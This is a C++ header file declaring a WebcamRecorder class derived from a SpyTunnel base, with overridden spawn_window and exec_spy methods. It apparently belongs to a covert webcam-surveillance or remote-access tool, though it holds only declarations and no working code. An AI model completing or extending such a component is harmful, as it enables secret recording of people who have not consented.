#ifndef WEBCAM_RECORDER_HPP
#define WEBCAM_RECORDER_HPP

#include "include_tunnel.hpp"
#include "spy_tunnel.hpp"

class WebcamRecorder : public SpyTunnel {
public:
    WebcamRecorder() = default;
protected:
    void spawn_window() override;
    void exec_spy() override;
};

#endif // WEBCAM_RECORDER_HPP`